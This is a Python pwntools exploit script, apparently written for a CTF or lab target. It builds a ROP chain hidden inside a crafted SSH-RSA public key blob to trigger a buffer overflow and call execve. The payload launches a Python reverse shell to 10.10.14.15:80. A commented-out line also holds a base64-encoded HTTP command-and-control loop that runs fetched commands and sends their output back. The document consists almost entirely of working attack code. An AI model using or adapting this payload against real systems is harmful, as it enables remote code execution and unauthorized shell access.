from base64 import b64encode
from pwn import *
import pyperclip

base_addr = 0x6010c0
# GADGETS
shr_eax = p64(0x400370)
not_al = p64(0x40036d)
pop_rdx = p64(0x40036a)
movss_xmm = p64(0x40037b)
cvtss2si_esi = p64(0x400380)
mov_rdi_rsi_pop_rdx = p64(0x400367)
syscall = p64(0x4003cf)

buf = b''

# Public Key Headers
buf += p32(7, endian='big')
buf += b'ssh-rsa'
buf += p32(3, endian='big')
buf += pack(0x10001, 24, endian='big') # e
#buf += p32(0x500, endian='big') # Length of N
buf += p32(0x801, endian='big') # Length of N
buf += b'\x00\xec'

#shell = b'from base64 import b64decode; exec(b64decode("aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCgp3aGlsZSBUcnVlOgogICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cDovLzEwLjEwLjE0LjE1IikKICAgIG91dHB1dCA9IG9zLnBvcGVuKHIudGV4dCwgJ3InLCAxKQogICAgcGF5bG9hZCA9IHsgJ3EnOiBvdXRwdXQgfQogICAgcmVxdWVzdHMuZ2V0KCJodHRwOi8vMTAuMTAuMTQuMTUvb3V0cHV0IiwgcGFyYW1zPXBheWxvYWQpCiAgICBzbGVlcCguMjUpCgo="))\0'
shell = b'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\0'

execve_args = [
        b'/usr/local/bin/python2\0',
        b'-c\0',
        shell 
        ]

# Build ARGV 
addrs_execve_args = []
for arg in execve_args:
    addrs_execve_args += [len(buf) + base_addr]
    buf += arg 

# Write Pointers PTRS
addr_argv = len(buf) + base_addr
for addr in addrs_execve_args:
    buf += p64(addr)
buf += p64(0)

# Get floating point addresses 
rdi_ptr = len(buf) + base_addr 
buf += struct.pack('<f', addrs_execve_args[0])
rsi_ptr = len(buf) + base_addr 
buf += struct.pack('<f', addr_argv)

buf += b'A' * (776 - len(buf))
# Setting RAX
buf += not_al
buf += shr_eax
buf += shr_eax
buf += not_al
buf += shr_eax
buf += not_al
buf += shr_eax
buf += shr_eax
buf += shr_eax
buf += not_al
buf += shr_eax
buf += shr_eax
# Setting RDI 
buf += pop_rdx
buf += p64(rdi_ptr)
buf += movss_xmm
buf += cvtss2si_esi
buf += mov_rdi_rsi_pop_rdx
# Set RSI 
buf += p64(rsi_ptr)
buf += movss_xmm
buf += cvtss2si_esi
# Set RDI 
buf += pop_rdx
buf += p64(0)
# Syscall
buf += syscall

buf = buf.ljust(0x817, b'\0')
b64str = b64encode(buf).decode()
print(b64str)
#print(len(buf))
pyperclip.copy(b64str)

